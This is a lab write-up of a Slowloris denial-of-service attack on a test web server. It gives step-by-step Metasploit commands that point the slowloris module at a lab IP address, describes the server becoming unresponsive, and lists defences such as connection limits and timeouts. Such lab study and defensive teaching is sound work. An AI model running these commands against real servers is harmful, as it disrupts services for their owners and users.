# Slowloris Attack

## Introduction
The Slowloris attack is a type of Denial-of-Service (DoS) attack that targets web servers by opening multiple simultaneous HTTP connections and keeping them alive as long as possible. This exhausts the server's available connection pool, preventing it from handling legitimate requests.

---

## Attack Scenario

### Target
- **Web-SRV2**  
  IP: `192.168.1.7`  
  Running web services via XAMPP

### Attacker
- **Kali Linux**  
  IP: `192.168.1.8`

---

## Normal Operation
Before the attack:  
- Web-SRV2 runs normally with web services active.  
- Remote-PC1 can access `http://192.168.1.7` without any issues.

---

## Launching the Attack
1. Open Metasploit on the attacker machine:

```bash
msfconsole
```

2. Search for the Slowloris module:

```bash
msf6> search slowloris
```

3. Select and use the module:

```bash
msf6> use 0
```

4. Configure the target host:

```bash
msf6 auxiliary(dos/http/slowloris) > options
msf6 auxiliary(dos/http/slowloris) > set rhost 192.168.1.7
```

5. Run the attack:

```bash
msf6 auxiliary(dos/http/slowloris) > run
```

---

## Observed Effect
- After some time, **Web-SRV2 becomes unresponsive** and cannot serve legitimate requests.  
- Wireshark captures show multiple open TCP connections maintained for an extended period.  
- Stopping the attack releases the connections and Web-SRV2 returns to normal operation.

---

## Defensive Measures
- **Web server configuration**: Limit maximum concurrent connections per IP.  
- **Timeout settings**: Reduce the timeout for idle HTTP connections.  
- **Load balancers / reverse proxies**: Protect backend servers by managing connection pools.  
- **Intrusion detection / prevention**: Monitor for abnormal connection patterns.

---

## Summary
The Slowloris attack demonstrates how resource exhaustion can disrupt a web server without generating high bandwidth. Proper server configuration, connection management, and monitoring are key to preventing this type of DoS attack.
